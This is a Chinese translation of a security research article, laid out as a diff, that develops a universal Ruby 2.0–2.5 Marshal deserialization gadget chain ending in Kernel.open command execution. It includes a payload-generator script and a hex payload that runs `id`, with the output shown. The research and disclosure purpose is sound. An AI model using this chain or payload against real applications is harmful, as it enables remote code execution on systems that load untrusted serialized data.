@@ -1,0 +1,617 @@
+# Ruby2.X 远程代码执行漏洞分析之反序列化gadget链
+
+阅读量 **233220**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-11-12 11:00:37
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 elttam，文章来源：elttam.com.au
+
+原文地址：<https://www.elttam.com.au/blog/ruby-deserialization/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p0.ssl.qhimg.com/t013f350c3c76772380.gif)
+
+## 介绍
+
+这篇文章会详细介绍对[ruby](https://www.ruby-lang.org/zh_cn/)的任意反序列化利用，同时还发布了首个通用型gadget链，用来实现Ruby
+2.x的任意命令执行。在接下来的文章里，我会详细说明反序列化的问题以及相关研究，如何发现了可用的gadget链，直到最后成功利用了ruby序列化。
+
+## 背景
+
+首先，[序列化](https://en.wikipedia.org/wiki/Serialization)是将对象转换为可以进行网络传输或者存储在文件系统、数据库中的字节的过程，这些字节里就包括重建原始对象所需要的所有相关信息，而这种重建的过程就被称为反序列化。每种编程语言通常都会有自己独特的序列化格式，不同编程语言引用该过程的名称也会有所不同，而Ruby通常采用的
+marshalling 和unmarshalling 这两个名称。
+
+Marshal 类具有 “dump” 和 “load” 两种方法，使用方式如下：
+
+Marshal.dump 和 Marshal.load 的用法
+
+    
+    
+    $ irb
+    >> class Person
+    >>   attr_accessor :name
+    >> end
+    => nil
+    
+    >> p = Person.new
+    => #<Person:0x00005584ba9af490>
+    
+    >> p.name = "Luke Jahnke"
+    => "Luke Jahnke"
+    
+    >> p
+    => #<Person:0x00005584ba9af490 @name="Luke Jahnke">
+    
+    >> Marshal.dump(p)
+    => "x04bo:vPersonx06:n@nameI"x10Luke Jahnkex06:x06ET"
+    
+    >> Marshal.load("x04bo:vPersonx06:n@nameI"x10Luke Jahnkex06:x06ET")
+    => #<Person:0x00005584ba995dd8 @name="Luke Jahnke">
+
+## 不受信任数据的反序列化问题
+
+序列化对象是不透明的二进制格式，所以开发者总以为攻击者无法查看或者篡改，这种错误的认知往往会导致常见安全漏洞。结果这就导致了存储在对象中的任何敏感信息都会被泄露给攻击者，比如凭证或应用程序密钥。就序列化对象之后用于权限检查的实例变量来说，经常会导致权限提升的问题。例如，考虑一个包含username实例变量的User对象，该对象被序列化可能会被攻击者篡改。此时修改序列化数据并将username变量更改为一个较高权限用户的用户名（例如
+“admin” ）轻而易举。虽然这类攻击看起来很厉害，但具有高度的前后关联性而且从技术角度来说确实平淡无奇，因此在本文中不会进一步讨论。
+
+代码重放攻击也有可能发生，即执行一些叫做gadget的已经可利用的代码，去完成一些非预期的操作，比如说去执行一个任意的系统命令。由于反序列化可以将实例变量设置为任意值，因此攻击者可以控制gadget操作的某些数据，当然攻击者也可使用第一个gadget去调用第二个gadget，因为方法经常被存储在实例变量中的对象调用。当一系列gadget以这种方式链接在一起时，就被称为gadget链。
+
+## 曾经的PAYLOAD
+
+在[OWASP Top 10 Most Critical Web Application Security Risks for
+2017](https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf)（2017年OWASP最关键的Web应用安全风险top10）中，不安全的反序列化排在第八位，但公布的关于构建Ruby
+gadget链的细节却非常少。然而，Phrack上有一篇叫Attacking Ruby on Rails
+Applications的文章，可以作为一个很好的参考。[joernchen](https://twitter.com/joernchen)在文章的第2.1节中描述了[Charlie
+Somerville](https://twitter.com/charliesome)发现的能够实现任意代码执行的gadget链。这里就不再展开讨论这一技术，但前提如下：
+
+  1. 必须安装且加载ActiveSupport gem。
+  2. 必须加载标准库中的ERB（默认情况下Ruby不加载）。
+  3. 反序列化后，必须在反序列化的对象上调用不存在的方法。
+
+虽然Ruby on Rails Web应用基本都会满足这些前提，但其他Ruby应用很少能够满足。
+
+现在，我们的挑战就是能否在无视这些前提的情况下，仍然可以实现任意代码执行？
+
+## 寻找gadgets
+
+我们希望能够创建一个没有依赖项的gadget链，所以gadget只能从标准库中取。需要注意的是，并非所有的标准库都是默认加载的，这就限制了我们能够拥有的gadget的数量。例如，对Ruby2.5.3版本进行测试，发现默认情况下有358个类已经被加载，数量看起来很多，但仔细观察后我们发现，其中196个类没有定义任何自己的实例方法。这些空类大多数都是唯一命名的Exception类的后代，用于区分可捕获的异常。
+
+可用类的数量有限，这意味着发现能够提高加载标准库数量的gadget或技巧是非常有好处的。一种技巧是寻找在被调用时会require另一个库的gadget，这是很有用的，因为即使require只出现在了某个模块或者类的范围中，实际上也会污染全局命名空间。
+
+调用require（lib / rubygems.rb）的方法示例
+
+    
+    
+    module Gem
+    ...
+      def self.deflate(data)
+        require 'zlib'
+        Zlib::Deflate.deflate data
+      end
+    ...
+    end
+
+如果上述Gem.deflate方法包含在gadget链中，就会加载Ruby标准库中的Zlib库，如下所示：
+
+被污染的全局命名空间的演示
+
+    
+    
+    $ irb
+    >> Zlib
+    NameError: uninitialized constant Zlib
+    ...
+    
+    >> Gem.deflate("")
+    => "xx9Cx03x00x00x00x00x01"
+    
+    >> Zlib
+    => Zlib
+
+虽然标准库中存在有大量会动态加载标准库其他部分的示例，但如果已在系统上安装了第三方库，则会发现一个实例正在尝试加载第三方库，如下所示：
+
+标准库中的SortedSet在加载第三方的RBTree库（lib / set.rb）
+
+    
+    
+    ...
+    class SortedSet < Set
+    ...
+      class << self
+    ...
+        def setup
+    ...
+              require 'rbtree'
+
+下图显示了在加载未安装库（包括其他库目录）时，将会被搜索的位置：
+
+当Ruby试图在没有安装RBTree的默认系统上加载RBTree时，从strace输出的一个示例
+
+    
+    
+    $ strace -f ruby -e 'require "set"; SortedSet.setup' |& grep -i rbtree | nl
+         1    [pid    32] openat(AT_FDCWD, "/usr/share/rubygems-integration/all/gems/did_you_mean-1.2.0/lib/rbtree.rb", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+         2    [pid    32] openat(AT_FDCWD, "/usr/local/lib/site_ruby/2.5.0/rbtree.rb", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+         3    [pid    32] openat(AT_FDCWD, "/usr/local/lib/x86_64-linux-gnu/site_ruby/rbtree.rb", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+    ...
+       129    [pid    32] stat("/var/lib/gems/2.5.0/gems/strscan-1.0.0/lib/rbtree.so", 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
+       130    [pid    32] stat("/var/lib/gems/2.5.0/extensions/x86_64-linux/2.5.0/strscan-1.0.0/rbtree", 0x7ffc0b805ec0) = -1 ENOENT (No such file or directory)
+       131    [pid    32] stat("/var/lib/gems/2.5.0/extensions/x86_64-linux/2.5.0/strscan-1.0.0/rbtree.rb", 0x7ffc0b805ec0) = -1 ENOENT (No such file or directory)
+       132    [pid    32] stat("/var/lib/gems/2.5.0/extensions/x86_64-linux/2.5.0/strscan-1.0.0/rbtree.so", 0x7ffc0b805ec0) = -1 ENOENT (No such file or directory)
+       133    [pid    32] stat("/usr/share/rubygems-integration/all/gems/test-unit-3.2.5/lib/rbtree", 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
+       134    [pid    32] stat("/usr/share/rubygems-integration/all/gems/test-unit-3.2.5/lib/rbtree.rb", 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
+       135    [pid    32] stat("/usr/share/rubygems-integration/all/gems/test-unit-3.2.5/lib/rbtree.so", 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
+       136    [pid    32] stat("/var/lib/gems/2.5.0/gems/webrick-1.4.2/lib/rbtree", 0x7ffc0b805710) = -1 ENOENT (No such file or directory)
+    ...
+
+一个更有用的gadget能将攻击者控制的参数传递给require。这个gadget将允许在文件系统上加载任意文件，从而提供标准库中任何gadget的使用，包括Charlie
+Somerville的gadget链中使用的ERBgadget。虽然还没有发现能够完全控制require参数的gadget，但下面是一个允许控制部分参数的gadget实例：
+
+允许部分控制require参数的gadget（ext / digest / lib / digest.rb）
+
+    
+    
+    module Digest
+      def self.const_missing(name) # :nodoc:
+        case name
+        when :SHA256, :SHA384, :SHA512
+          lib = 'digest/sha2.so'
+        else
+          lib = File.join('digest', name.to_s.downcase)
+        end
+    
+        begin
+          require lib
+    ...
+
+但上面的实例并不能被使用，因为const_missing在标准库中的任何Ruby代码都不会显式调用。这并不奇怪，因为const_missing是一个[钩子方法](https://docs.ruby-lang.org/en/2.5.0/Module.html#method-i-const_missing)，在定义时，将在引用未定义的常量时调用。像[@object](https://github.com/object
+"@object")._send_([@method](https://github.com/method
+"@method")，[@argument](https://github.com/argument
+"@argument"))这样的gadget允许用一个任意参数对任意对象调用任意方法，明显可以调用上面的const_missing方法。如果我们已经有了这样一个强大的gadget，就并不需要再去增加可用的gadget集，因为它本身就允许执行任意的系统命令。
+
+const_missing方法也可以作为调用const_get的结果去被调用。lib / rubygems / package.rb文件中定义的Gem ::
+Package类的digest方法是一个合适的gadget，因为它在Digest模块上调用const_get（尽管任何上下文也可以工作）并控制参数。但是，const_get的默认实现会对字符集执行严格验证，以防止在digest目录之外进行遍历。
+
+另一种调用const_missing的方法是使用Digest ::
+SOME_CONSTANT等代码隐式调用。但是，Marshal.load不会以调用const_missing的方式执行常量解析。更多细节可以在Ruby
+issue[3511](https://bugs.ruby-lang.org/issues/3511)和[12731](https://bugs.ruby-lang.org/issues/12731)中找到。
+
+另一个示例gadget也提供了对传递给require的部分参数的控制，如下所示：
+
+使用参数调用 [] 方法会导致该参数包含在require（lib / rubygems / command_manager.rb）的参数中
+
+    
+    
+    class Gem::CommandManager
+      def [](command_name)
+        command_name = command_name.intern
+        return nil if @commands[command_name].nil?
+        @commands[command_name] ||= load_and_instantiate(command_name)
+      end
+    
+      private
+    
+      def load_and_instantiate(command_name)
+        command_name = command_name.to_s
+    ...
+            require "rubygems/commands/#{command_name}_command"
+    ...
+        end
+      end
+    ...
+
+由于“_command”后缀以及不允许截断（即使用空字节）的技术，上面的示例也没有得到利用。有许多文件确实存在“_command”后缀，但由于发现了增加可用gadget集的不同技术，所以没有进一步研究这些文件。然而，有兴趣的研究人员可能会发现，在探索这个主题时进行调查会很有意思。
+
+如下所示，Rubygem库广泛使用该autoload方法：
+
+对autoload方法的一些调用（lib / rubygems.rb）
+
+    
+    
+    module Gem
+    ...
+      autoload :BundlerVersionFinder, 'rubygems/bundler_version_finder'
+      autoload :ConfigFile,         'rubygems/config_file'
+      autoload :Dependency,         'rubygems/dependency'
+      autoload :DependencyList,     'rubygems/dependency_list'
+      autoload :DependencyResolver, 'rubygems/resolver'
+      autoload :Installer,          'rubygems/installer'
+      autoload :Licenses,           'rubygems/util/licenses'
+      autoload :PathSupport,        'rubygems/path_support'
+      autoload :Platform,           'rubygems/platform'
+      autoload :RequestSet,         'rubygems/request_set'
+      autoload :Requirement,        'rubygems/requirement'
+      autoload :Resolver,           'rubygems/resolver'
+      autoload :Source,             'rubygems/source'
+      autoload :SourceList,         'rubygems/source_list'
+      autoload :SpecFetcher,        'rubygems/spec_fetcher'
+      autoload :Specification,      'rubygems/specification'
+      autoload :Util,               'rubygems/util'
+      autoload :Version,            'rubygems/version'
+    ...
+    end
+
+autoload的工作方式与require类似，但只在首次访问已注册的常量时才加载指定的文件。由于这种特性，如果这些常量中的任何一个被包含在反序列化payload中，那么相应的文件将被加载。这些文件本身还包含require和autoload语句，进一步增加了可以提供有用gadget的文件数量。
+
+尽管在Ruby3.0的[未来版本中不会保留](https://bugs.ruby-lang.org/issues/5653)autoload，但随着Ruby2.5的发布，最近标准库中的使用量有所增加。在这个[git提交](https://github.com/ruby/ruby/commit/ec7c76c446fcb7fafae2fa2f7eda78c2387fac23)中引入了使用autoload的新代码，可以在下面的代码片段中看到：
+
+Ruby 2.5中引入的autoload的新用法（lib / uri / generic.rb）
+
+    
+    
+    require 'uri/common'
+    autoload :IPSocket, 'socket'
+    autoload :IPAddr, 'ipaddr'
+    
+    module URI
+    ...
+
+为了帮助在标准库中探索这个扩展的可用gadget集，我们可以用下面的代码加载每一个用autoload注册的文件：
+
+使用每个字符强制对每个对象进行固定解析
+
+    
+    
+    ObjectSpace.each_object do |clazz|
+      if clazz.respond_to? :const_get
+        Symbol.all_symbols.each do |sym|
+          begin
+            clazz.const_get(sym)
+          rescue NameError
+          rescue LoadError
+          end
+        end
+      end
+    end
+
+运行上面的代码之后，我们对提供gadget的类的数量进行了新的统计，找到了959个类，比之前的358个增加了658个。在这些类中，有511个至少定义了一个实例方法。加载这些附加类的能力为我们开始搜索有用的gadget提供了极大的改善。
+
+###  初始化/启动gadget
+
+每个gadget链的开始都需要一个在反序列化期间或之后自动调用的gadget。这是执行更多gadgets的初始入口点，其最终目标是实现任意代码执行或其他攻击。
+
+理想的初始gadget应该是在反序列化期间由Marshal.load自动调用的gadget。这消除了反序列化后执行的代码对恶意对象进行防御性检查和保护的机会。我们怀疑在反序列化期间可能会自动调用gadget是一些编程语言的特性，比如PHP。在PHP中，如果一个类定义了[魔术方法](https://secure.php.net/manual/en/language.oop5.magic.php#object.wakeup)__wakeup，则在反序列化此类型的对象时将立即调用它。读取[相关的Ruby文档](https://ruby-doc.org/core-2.5.0/Marshal.html#module-Marshal-label-marshal_dump+and+marshal_load)会发现，如果一个类定义了一个实例方法marshal
+load，那么这个方法将在对该类对象进行反序列化时被调用。
+
+使用这些信息，我们检查每个加载的类，并检查它们是否具有marshal load实例方法。这是通过以下代码以编程方式实现的：
+
+Ruby脚本，用于查找定义了marshal_load的所有类
+
+    
+    
+    ObjectSpace.each_object(::Class) do |obj|
+      all_methods = obj.instance_methods + obj.protected_instance_methods + obj.private_instance_methods
+    
+      if all_methods.include? :marshal_load
+        method_origin = obj.instance_method(:marshal_load).inspect[/((.*))/,1] || obj.to_s
+    
+        puts obj
+        puts "  marshal_load defined by #{method_origin}"
+        puts "  ancestors = #{obj.ancestors}"
+        puts
+      end
+    end
+
+### 剩余的gadgets
+
+我在研究期间发现了许多gadget，但最终gadget链中只使用了一小部分。为简洁起见，下面总结了一些有意思的内容：
+
+结合调用缓存方法的gadget链，这个gadget允许任意代码执行（lib / rubygems / source / git.rb）
+
+    
+    
+    class Gem::Source::Git < Gem::Source
+    ...
+      def cache # :nodoc:
+    ...
+          system @git, 'clone', '--quiet', '--bare', '--no-hardlinks',
+                 @repository, repo_cache_dir
+    ...
+      end
+    ...
+
+此gadget可用于让to_s返回除预期的String对象之外的其他内容（lib / rubygems / security / policy.rb）
+
+    
+    
+    class Gem::Security::Policy
+    ...
+      attr_reader :name
+    ...
+      alias to_s name # :nodoc:
+    
+    end
+
+这个gadget可用于让to_i返回除预期的Integer对象之外的其他东西（lib / ipaddr.rb）
+
+    
+    
+    class IPAddr
+    ...
+      def to_i
+        return @addr
+      end
+    ...
+
+当反序列化进入无限循环时此代码生成一个gadget链
+
+    
+    
+    module Gem
+      class List
+        attr_accessor :value, :tail
+      end
+    end
+    
+    $x = Gem::List.new
+    $x.value = :@elttam
+    $x.tail = $x
+    
+    class SimpleDelegator
+      def marshal_dump
+        [
+          :__v2__,
+          $x,
+          [],
+          nil
+        ]
+      end
+    end
+    
+    ace = SimpleDelegator.new(nil)
+    
+    puts Marshal.dump(ace).inspect
+
+## 构建gadget链
+
+创建gadget链的第一步是构建候选marshal_load初始gadget池，并确保它们能够调用我们提供的对象上的方法。这很可能包含每个初始gadget，因为Ruby中的“一切都是对象”。我们可以通过检查实现并在我们控制的对象上保留任何调用公共方法名的方法来减少池，理想情况下，常用方法名称应该有许多不同的实现可供选择。
+
+对于我的gadget链，我选择了Gem:: requirements类，其实现如下所示，并授予对任意对象调用each方法的能力:
+
+Gem :: Requirement部分源代码（lib / ruby​​gems / requirement.rb） – 参见内联注释
+
+    
+    
+    class Gem::Requirement
+      # 1) we have complete control over array
+      def marshal_load(array)
+        # 2) so we can set @requirements to an object of our choosing
+        @requirements = array[0]
+    
+        fix_syck_default_key_in_requirements
+      end
+    
+      # 3) this method is invoked by marshal_load
+      def fix_syck_default_key_in_requirements
+        Gem.load_yaml
+    
+        # 4) we can call .each on any object
+        @requirements.each do |r|
+          if r[0].kind_of? Gem::SyckDefaultKey
+            r[0] = "="
+          end
+        end
+      end
+    
+    end
+
+现在有了调用each方法的能力，我们需要each方法的一个有用的实现，来使我们更接近于任意命令执行。查看了Gem::DependencyList(和mixin
+Tsort)的源代码之后，发现对each实例方法的调用将导致对[@specs](https://github.com/specs
+"@specs")实例变量调用sort方法。这里没有包含到达sort方法调用的确切路径，但是可以使用下面的命令来验证该行为，该命令使用Ruby的stdlib
+[Tracer](https://ruby-doc.org/stdlib-2.5.0/libdoc/tracer/rdoc/Tracer.html)类输出源级别的执行跟踪：
+
+在 [@specs](https://github.com/specs "@specs").sort 中验证
+Gem::DependencyList#each 的结果
+
+    
+    
+    $ ruby -rtracer -e 'dl=Gem::DependencyList.new; dl.instance_variable_set(:@specs,[nil,nil]); dl.each{}' |& fgrep '@specs.sort'
+    #0:/usr/share/rubygems/rubygems/dependency_list.rb:218:Gem::DependencyList:-:     specs = @specs.sort.reverse
+
+有了这种对任意对象数组调用sort方法的新功能，我们可以利用它对任意对象调用<=>方法([spaceship
+operator](https://en.wikipedia.org/wiki/Three-way_comparison))。这还挺有用的，因为Gem::Source::SpecificFile有一个<=>方法的implementation，当调用它时，它的[@spec](https://github.com/spec
+"@spec")实例变量就会调用name方法，如下所示:
+
+Gem :: Source :: SpecificFile 部分源代码（lib / rubygems / source /
+specific_file.rb）
+
+    
+    
+    class Gem::Source::SpecificFile < Gem::Source
+      def <=> other
+        case other
+        when Gem::Source::SpecificFile then
+          return nil if @spec.name != other.spec.name # [1]
+    
+          @spec.version <=> other.spec.version
+        else
+          super
+        end
+      end
+    
+    end
+
+在任意对象上调用name方法是整个过程的最后一步，因为Gem::StubSpecification有一个name方法，它会调用它的data方法。然后data方法调用open方法，这实际上是Kernel.open，它的实例变量[@loaded_from](https://github.com/loaded_from
+"@loaded_from")作为第一个参数，如下所示:
+
+Gem :: BasicSpecification（lib / rubygems / basic_specification.rb）和Gem ::
+StubSpecification（lib / rubygems / stub_specification.rb）的部分源代码
+
+    
+    
+    class Gem::BasicSpecification
+      attr_writer :base_dir # :nodoc:
+      attr_writer :extension_dir # :nodoc:
+      attr_writer :ignored # :nodoc:
+      attr_accessor :loaded_from
+      attr_writer :full_gem_path # :nodoc:
+    ...
+    end
+    
+    class Gem::StubSpecification < Gem::BasicSpecification
+    
+      def name
+        data.name
+      end
+    
+      private def data
+        unless @data
+          begin
+            saved_lineno = $.
+    
+            # TODO It should be use `File.open`, but bundler-1.16.1 example expects Kernel#open.
+            open loaded_from, OPEN_MODE do |file|
+    ...
+
+当第一个参数的第一个字符是[相关文档](https://ruby-doc.org/core-2.5.0/Kernel.html#method-i-open)中所描述的管道字符（“|”）时，可以使用Kernel.open来执行任意命令，有趣的是，看下在open上方的TODO注释是否很快就能解决。
+
+## 生成有效的payload
+
+下面的脚本用于生成和测试前面描述的gadget链:
+
+生成并验证反序列化gadget链的脚本
+
+    
+    
+    #!/usr/bin/env ruby
+    
+    class Gem::StubSpecification
+      def initialize; end
+    end
+    
+    
+    stub_specification = Gem::StubSpecification.new
+    stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")
+    
+    puts "STEP n"
+    stub_specification.name rescue nil
+    puts
+    
+    
+    class Gem::Source::SpecificFile
+      def initialize; end
+    end
+    
+    specific_file = Gem::Source::SpecificFile.new
+    specific_file.instance_variable_set(:@spec, stub_specification)
+    
+    other_specific_file = Gem::Source::SpecificFile.new
+    
+    puts "STEP n-1"
+    specific_file <=> other_specific_file rescue nil
+    puts
+    
+    
+    $dependency_list= Gem::DependencyList.new
+    $dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])
+    
+    puts "STEP n-2"
+    $dependency_list.each{} rescue nil
+    puts
+    
+    
+    class Gem::Requirement
+      def marshal_dump
+        [$dependency_list]
+      end
+    end
+    
+    payload = Marshal.dump(Gem::Requirement.new)
+    
+    puts "STEP n-3"
+    Marshal.load(payload) rescue nil
+    puts
+    
+    
+    puts "VALIDATION (in fresh ruby process):"
+    IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
+      pipe.print payload
+      pipe.close_write
+      puts pipe.gets
+      puts
+    end
+    
+    puts "Payload (hex):"
+    puts payload.unpack('H*')[0]
+    puts
+    
+    
+    require "base64"
+    puts "Payload (Base64 encoded):"
+    puts Base64.encode64(payload)
+
+以下Bash one-liner验证payload是否针对空Ruby进程成功执行，显示版本2.0到2.5受到影响：
+
+生成并验证针对Ruby 2.0到2.5的反序列化gadget链的脚本
+
+    
+    
+    $ for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
+    uid=0(root) gid=0(root) groups=0(root)
+    uid=0(root) gid=0(root) groups=0(root)
+    uid=0(root) gid=0(root) groups=0(root)
+    uid=0(root) gid=0(root) groups=0(root)
+    uid=0(root) gid=0(root) groups=0(root)
+    uid=0(root) gid=0(root) groups=0(root)
+
+## 结论
+
+这篇文章探索并发布了一个通用的gadget链，可以在Ruby 2.0到2.5版本中实现命令执行。
+
+正如这篇文章所说明的那样，复杂的Ruby标准库在构建反序列化gadget链时非常有用。未来有很多的研究可以做，包括让利用技术涵盖Ruby1.8和1.9版本，以及覆盖使用命令行参数–disable-all调用Ruby进程的实例。当然也可以研究JRuby和Rubinius等可替代的Ruby解释器。
+
+我对[Fuzzing Ruby C
+扩展](https://schd.ws/hosted_files/bsidessf2018/de/Fuzzing_Ruby_C_Extensions.pdf)和[使用AFL-Fuzz打破Ruby的Unmarshal](https://medium.com/fuzzstation/breaking-rubys-unmarshal-with-afl-fuzz-6b5f72b581d5)进行了一些研究。完成此调查后，似乎还有充分的机会进行进一步研究，包括手动代码审计，marshal_load以下所示方法的本机代码实现：
+
+用C实现的marshal_load实例
+
+    
+    
+    complex.c:    rb_define_private_method(compat, "marshal_load", nucomp_marshal_load, 1);
+    iseq.c:    rb_define_private_method(rb_cISeq, "marshal_load", iseqw_marshal_load, 1);
+    random.c:    rb_define_private_method(rb_cRandom, "marshal_load", random_load, 1);
+    rational.c:    rb_define_private_method(compat, "marshal_load", nurat_marshal_load, 1);
+    time.c:    rb_define_private_method(rb_cTime, "marshal_load", time_mload, 1);
+    ext/date/date_core.c:    rb_define_method(cDate, "marshal_load", d_lite_marshal_load, 1);
+    ext/socket/raddrinfo.c:    rb_define_method(rb_cAddrinfo, "marshal_load", addrinfo_mload, 1);
+
+本文翻译自elttam.com.au [原文链接](https://www.elttam.com.au/blog/ruby-deserialization/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **gakki** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/163962](/post/id/163962)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [elttam.com.au](https://www.elttam.com.au/blog/ruby-deserialization/)
+
+如若转载,请注明出处： <https://www.elttam.com.au/blog/ruby-deserialization/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [漏洞分析](/tag/漏洞分析)
+  * [RCE](/tag/RCE)
+  * [反序列化](/tag/反序列化)
+  * [ruby](/tag/ruby)
+
+ **+1** __3赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t01f249cd40c090faa0.png) gakki
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
